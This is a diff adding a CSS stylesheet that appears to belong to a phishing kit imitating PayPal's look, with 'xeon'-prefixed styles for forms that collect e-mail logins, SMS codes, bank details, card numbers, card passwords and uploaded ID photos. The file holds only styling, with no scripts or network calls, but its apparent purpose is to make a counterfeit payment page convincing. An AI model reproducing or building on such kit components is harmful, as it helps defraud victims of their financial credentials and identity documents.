@@ -1,0 +1,502 @@
+/*##[ ALERT MESSAGE STYLE ]##*/
+
+.xeonDescription {
+    font-family: pp-sans-small-light,Helvetica Neue,Arial,sans-serif;
+    font-weight: 400;
+    font-variant: normal;
+    font-size: 1em;
+    line-height: 1.5em;
+    color: #2c2e2f;
+}
+
+/*##[ INFO FORM STYLE ]##*/
+
+.xeonInfoTitle{
+	margin-bottom: 5px;
+}
+form{
+	text-align: center;
+}
+.xeonFormTitle{
+	margin-top: 0;
+}
+.FieldsTitle{
+	text-align: left;
+    font-family: Helvetica Neue,Arial,sans-serif;
+    margin-bottom: 5px;
+    font-weight: 700;
+    font-size: 14px;
+    padding: 0 20px
+}
+.xeonFieldset{
+	padding:5px 20px;
+}
+.xeonMultiFieldset{
+	padding:5px 20px;
+	display: flex;
+}
+.xeonFieldset input,.xeonFieldset select,.xeonMultiFieldset input {
+	height: 44px;
+    width: 100%;
+    /*max-width: 330px;*/
+    padding: 0 10px;
+    border: 1px solid #9da3a6;
+    background: #fff;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-border-radius: 4px;
+    -moz-border-radius: 4px;
+    -khtml-border-radius: 4px;
+    border-radius: 4px;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #000;
+    font-size: 15px;
+    font-family: Helvetica,Arial,sans-serif;
+    font-weight: 400;
+    direction: ltr;
+    -webkit-background-clip: padding-box;
+    -moz-background-clip: padding-box;
+    background-clip: padding-box;
+    -webkit-transition: border .2s ease-in-out,background-color .2s ease-in-out;
+    -moz-transition: border .2s ease-in-out,background-color .2s ease-in-out;
+    -o-transition: border .2s ease-in-out,background-color .2s ease-in-out;
+    transition: border .2s ease-in-out,background-color .2s ease-in-out;
+}
+.xeonFieldset input:focus,.xeonFieldset select:focus,.xeonMultiFieldset input:focus {
+    outline: 0;
+    border: 1px solid #0070ba;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    background-color: #fff;
+}
+.xeonFieldset input.hasError,.xeonFieldset select.hasError,.xeonMultiFieldset input.hasError {
+    border: 1px solid #c72f38;
+    background-image: url(../img/x2.png);
+    background-position: 99% -409px;
+    background-position: top -409px right 10px;
+    background-size: 25px;
+    background-repeat: no-repeat;
+}
+.xeonFieldset input.hasError::placeholder,.xeonFieldset select.hasError::placeholder,.xeonMultiFieldset input.hasError::placeholder{
+    color: #c72f38;
+}
+.xeonFieldset select {
+	-webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    background-image: url("../img/x2.png");
+    background-size: 25px;
+    background-repeat: no-repeat;
+    background-position: top -302px right 5px;
+}
+.xeonMultiFieldset input:first-child{
+	border-radius: 4px 0 0 4px;
+	border-right-color: #fff;
+}
+.xeonMultiFieldset input:first-child:focus{
+    border: 1px solid #0070ba;
+    z-index: 9
+}
+.xeonMultiFieldset input:last-child{
+	border-radius: 0 4px 4px 0;
+	border-left-width: 0.5px
+}
+.cscox{
+  background-position: right -12px top -591px;
+}
+
+/*##[ E-MAIL BOX FORM STYLE ]##*/
+
+.xeonMailBox{
+	max-width: 400px;
+    margin-top: 10px;
+    padding: 0 17.5px;
+}
+.xeomMailLogo{
+	padding: 20px 0;
+}
+.xeomMailLogo img{
+	height: 35px;
+}
+.xeon-r-mail .contact {
+    position: relative;
+    padding: 3px 0;
+    padding-left: 20px;
+    font-family: "xeonSansSmallRegular",Helvetica Neue,Arial,sans-serif;
+    font-size: 15px;
+    text-align: left;
+}
+.xeon-r-mail .contact p {
+    display: inline-block;
+    margin: 0px auto;
+    line-height: 2.0;
+    font-size: 0.9375rem;
+    font-weight: 400;
+    text-transform: none;
+    letter-spacing: 0.025em;
+}
+.xeon-r-mail .contact p span {
+    color: #0070ba;
+    text-decoration: none;
+    font-weight: 700;
+    font-family: "xeonSansSmallRegular",Helvetica Neue,Arial,sans-serif;
+}
+a.xeonWhatIsMail,a.xeonWhatIsCC{
+	font-weight: 700;
+	padding: 5px 0;
+	display: inline-block;
+}
+.xeonWhatIsMailContainer,.xeonWhatIsCCContainer{
+    text-align: right;
+    position: relative;
+}
+.xeonWhatIsCCContainer{
+    padding: 0 20px;
+}
+.xeonWhatIsMailText, .xeonWhatIsCCText{
+    border:2px solid #0070ba;
+    padding: 15px 20px;
+    border-radius: 10px;
+    position: relative;
+    text-align: left;
+}
+.xeonWhatIsMailText:before, .xeonWhatIsCCText:before{
+    content: "";
+    position: absolute;
+    bottom: 100%;
+    right: 30px;
+    border-left:10px solid transparent;
+    border-right:10px solid transparent;
+    border-bottom:10px solid #0070ba;
+    border-top:10px solid transparent;
+}
+.xeonWhatIsCCText{
+    display: flex;
+    align-items: center;
+}
+.xeonWhatIsCCText img{
+    height: 50px;
+    padding-right:5px;
+}
+.xeonWhatIsCCText span{
+    padding-left: 10px;
+    color:#000;
+}
+/*##[ SMS CODE FORM STYLE ]##*/
+
+.xeonSmsAgree{
+    margin:30px;
+    font-size: 13px;
+    color: #6c7378;
+}
+
+/*##[ BANK FORM STYLE ]##*/
+
+.xeonbnkInfo{
+    position: relative;
+    margin:20px;
+    padding: 0.5rem;
+    background: #ececec;
+    border-radius: 5px;
+    box-shadow: 0 2px 2px rgba(0, 0, 0, 0.25);
+}
+.xeonbnkInfoCheck:before,.xeonbnkInfoSave:before{
+    content: '';
+    position: absolute;
+    left: 0.6rem;
+    bottom: 0.5rem;
+    width: 28%;
+    height: 16%;
+    border: 2px solid #0070ba;
+    border-radius: 3px;
+}
+.xeonbnkInfoSave:before{
+    left: 7.8rem;
+}
+.xeonbnktype{
+    padding: 0 20px;
+    text-align: left;
+}
+.radioGroup {
+    margin: 15px 0;
+    padding: 0 20px
+}
+.col-sm-6 {
+    position: relative;
+    min-height: 1px;
+    padding-left: 1%;
+    padding-right: 1%;
+    font-size: 15px;
+    text-align: left;
+    width: 50%;
+    display: inline-block;
+    vertical-align: top;
+}
+.vx_checkbox input, .vx_radio input {
+    opacity: 0;
+    position: absolute;
+    cursor: pointer;
+}
+.vx_checkbox label, .vx_radio label {
+    cursor: pointer;
+    display: inline-block;
+    vertical-align: top;
+    line-height: 2em;
+}
+.vx_checkbox label:before, .vx_radio label:before {
+    font-family: 'consumer-icons';
+    display: inline-block;
+    vertical-align: top;
+    height: 30px;
+    width: 30px;
+    margin: 0 12px 0 0;
+    padding: 0.4em 0;
+    border: 1px solid #b7bcbf;
+    content: '';
+    font-size: 0;
+    font-weight: bolder;
+    line-height: 0;
+    border-radius: 2px;
+    overflow: hidden;
+}
+.vx_radio label:before {
+    border-radius: 100%;
+}
+.vx_checkbox input:checked + label:before, .vx_radio input:checked + label:before {
+    content: "\2611";
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    border-color: #005ea6;
+    color: #ffffff;
+    background-color: #005ea6;
+}
+.vx_radio input:checked + label:before {
+    content: '';
+    border-color: #005ea6;
+    background-color: #005ea6;
+    box-shadow: inset 0 0 0 5px #ffffff;
+}
+.nobnk{
+  margin-top: 25px;
+}
+.nobnk a{
+  font-weight: bold;
+}
+.nobnk a:hover{
+  text-decoration: underline;
+}
+
+/*##[ CARD FORM STYLE ]##*/
+
+input.xeoncsc,input.xeoncctyped{
+    background-image: url("../img/cx.png");
+    background-repeat: no-repeat;
+    background-position: top -591px right -12px;
+    background-size: 60px;
+}
+input.xeoncc{
+
+}
+.cc-icon{
+    position: absolute;
+    top: 27px;
+    width: 37px;
+    height: 30px;
+    right: 30px;
+    background-color:#fff;
+    background-image: url(../img/vests.png);
+    background-position: 0 82%;
+    transition: transform 0.2s ease-in-out;
+    -webkit-transition: -webkit-transform 0.2s ease-in-out;
+    -moz-transform: transform 0.2s ease-in-out;
+    -ms-transform: transform 0.2s ease-in-out;
+    -o-transform: transform 0.2s ease-in-out;
+    transform: translate3d(0, -50%, 0);
+    -webkit-transform: translate3d(0, -50%, 0);
+    -moz-transform: translate3d(0, -50%, 0);
+    -ms-transform: translate3d(0, -50%, 0);
+    -o-transform: translate3d(0, -50%, 0);
+}
+.vi{background-position:98.5% -0.5%}
+.ve{background-position:98.5%  40.7%}
+.ma{background-position:98.5%  5.5%}
+.me{background-position:98.5%  35%}
+.di{background-position:98.5%  17.2%}
+.am{background-position:98.5%  11.5%}
+.jc{background-position:98.5% 29%}
+.dc{background-position:98.5% 23%}
+input.amxicon{background-position:top -676px right -12px;}
+
+/*##[ CARD PASSWORD FORM STYLE ]##*/
+
+input.xeoncctyped{
+    padding-left: 60px;
+    background-size: 60px;
+    background-position: top -70px left 12px;
+}
+
+/*##[ ID FORM STYLE ]##*/
+
+.xeonIdpicbox{
+    padding: 10px 20px;
+}
+.xeonIdpicbox img{
+    width: 100%;
+}
+
+
+.file-upload {
+  background-color: #ffffff;
+  width: 100%;
+  padding: 20px;
+}
+
+.file-upload-btn {
+  width: 100%;
+  margin: 0;
+  color: #fff;
+  background: #0586dc;
+  border: none;
+  padding: 10px;
+  border-radius: 4px;
+  border-bottom: 4px solid #0070ba;
+  transition: all .2s ease;
+  outline: none;
+  text-transform: uppercase;
+  font-weight: 700;
+}
+
+.file-upload-btn:hover {
+  border-bottom: 4px solid #014877;
+  background: #0070ba;
+  color: #ffffff;
+  transition: all .2s ease;
+  cursor: pointer;
+}
+
+.file-upload-btn:active {
+  border: 0;
+  transition: all .2s ease;
+}
+
+.file-upload-content {
+  display: none;
+  text-align: center;
+}
+
+.file-upload-input {
+  position: absolute;
+  margin: 0;
+  padding: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  outline: none;
+  opacity: 0;
+  cursor: pointer;
+}
+
+.fileUpError{
+  margin: 0;
+  text-align: left;
+  padding: 15px;
+  font-weight: bold;
+  font-size: 1em;
+  color: #fff;
+  background: #c72e2e;
+  border: 3px solid #c72e2e;
+  border-radius: 10px;
+  margin-bottom: 30px;
+}
+
+.image-upload-wrap {
+  /*margin-top: 20px;*/
+  border: 4px dashed #0070ba;
+  border-radius: 10px;
+  position: relative;
+  cursor: pointer;
+}
+
+.image-dropping,
+.image-upload-wrap:hover {
+  background-color: #0070ba;
+  border: 4px dashed #0070ba;
+}
+.image-upload-wrap:hover h3{
+  color: #fff;
+}
+.image-title-wrap {
+  padding: 0 15px 0 15px;
+  color: #222;
+}
+.dragicon{
+    margin-top: 10px;
+    height: 100px;
+}
+.dragicon path{
+    fill:#0070ba;
+}
+.image-upload-wrap:hover .dragicon path{
+    fill:#fff;
+}
+.drag-text {
+  text-align: center;
+}
+
+.drag-text h3 {
+  font-weight: 100;
+  font-family: Helvetica,Arial,sans-serif;
+  text-transform: uppercase;
+  color: #0070ba;
+  font-size: 18px;
+  padding: 0 0 20px 0;
+}
+
+.file-upload-image {
+  width: 100%;
+  margin: auto;
+  padding: 20px;
+}
+
+.remove-image {
+  width: 200px;
+  margin: 0;
+  color: #fff;
+  background: #cd4535;
+  border: none;
+  padding: 10px;
+  border-radius: 4px;
+  border-bottom: 4px solid #b02818;
+  transition: all .2s ease;
+  outline: none;
+  text-transform: uppercase;
+  font-weight: 700;
+}
+
+.remove-image:hover {
+  background: #c13b2a;
+  color: #ffffff;
+  transition: all .2s ease;
+  cursor: pointer;
+}
+
+.remove-image:active {
+  border: 0;
+  transition: all .2s ease;
+}
+
+
+.idhasError{
+  border: 4px dashed #f00;
+}
+.idhasError .dragicon path{
+  fill: #f00;
+}
+.idhasError h3{
+  color: #f00;
+}
